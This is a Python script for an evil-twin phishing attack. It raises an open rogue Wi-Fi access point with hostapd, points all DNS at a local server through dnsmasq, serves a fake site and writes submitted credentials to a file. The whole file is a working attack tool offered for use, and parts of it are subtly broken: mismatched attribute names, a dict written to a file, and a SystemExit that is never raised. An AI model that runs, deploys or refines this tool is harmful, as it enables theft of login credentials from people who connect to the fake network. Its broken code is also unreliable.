#!/usr/bin/env python3

import os
import argparse
import subprocess
import logging
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

HOSTAPD_CONFIG = """
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""

class IFace:
    def __init__(self, name):
        self.name = name

    def ensure_addr(self, addr, netmask):
        p = subprocess.Popen(f"ip addr add {addr}/{netmask} dev {self.name}".split(),
                    shell=False, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))
        p.wait()
        return p.returncode in [0,2]

class FischHttpHandler(BaseHTTPRequestHandler):
    TEMPLATE = None
    OUTFILE = None
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_response()
        self.wfile.write(bytes(self.template, "utf8"))

    def do_POST(self):
        # harvest credentials
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        if post_data:
            try:
                parsed = parse_qs(post_data.decode('utf-8'))
                with open(self.outfile, "a") as out:
                    out.write(parsed)
            except Exception as ex:
                logging.error(ex)

        self.send_error(404)

def get_installed_packages():
    try:
        from apt import Cache
    except ImportError as ie:
        logging.error(ie)
        return ['dnsmasq', 'hostapd'] # assume its installed
    return [pkg.name for pkg in Cache() if pkg.is_installed]

def check_requirements():
    requirements = set(['dnsmasq', 'hostapd'])
    installed = set(get_installed_packages())
    return requirements.issubset(installed)

def daemonize(command, stdout=None, stdin=None, stderr=None):
    if isinstance(command, str):
        command = command.split()
    return subprocess.Popen(command, shell=False, stdout=stdout, stdin=stdin, stderr=stderr)

def main():
    parser = argparse.ArgumentParser(description="Phish all the things!")
    parser.add_argument('--html-file', dest='template', help='File with the fake site.', required=True)
    parser.add_argument('--output-file', dest='outfile', help='File the credentials should be written to.', required=True)
    parser.add_argument('--iface', dest='iface', help='The interface which should be used.', required=True)
    parser.add_argument('--ssid', dest='ssid', help='The ssid of the rouge ap.', required=True)
    args = parser.parse_args()

    if not check_requirements():
        return 1

    iface = IFace(args.iface)
    iface.ensure_addr('192.168.66.1', '255.255.255.0') # gateway
    iface.ensure_addr('192.168.66.2', '255.255.255.0') # webserver binds to this

    # kill other processes
    os.system('killall dnsmasq hostapd')

    dev_null = open("/dev/null", "w")
    dnsmasq_cmd = [
        "dnsmasq",
        "--no-daemon", # don't deamonize
        "--no-hosts", # don't read the hostnames in /etc/hosts.
        "--interface=%s" % args.iface, # listen on this interface
        "--no-poll", # Don't poll /etc/resolv.conf for changes.
        "--no-resolv",
        "--dhcp-range=192.168.66.3,192.168.66.254,255.255.255.0,24h",
        "--dhcp-option=3,192.168.66.1", # gateway
        "--dhcp-option=6,192.168.66.1", # dns-server
        "--address=/#/192.168.66.2"
    ]
    dns_proc = daemonize(dnsmasq_cmd)

    hostap_cfg = HOSTAPD_CONFIG.format(iface=args.iface, ssid=args.ssid)
    hostapd_cmd = [
        "hostapd",
        "/dev/stdin"
    ]
    hostapd_proc = daemonize(hostapd_cmd, stdin=subprocess.PIPE)

    try:
        hostapd_proc.communicate(input=str.encode(hostap_cfg), timeout=1)
    except Exception:
        pass

    FischHttpHandler.TEMPLATE = open(args.template).read()
    FischHttpHandler.OUTFILE = args.outfile

    web = HTTPServer(('192.168.66.2', 80), FischHttpHandler)
    return web.serve_forever()

if __name__ == "__main__":
    SystemExit(main())
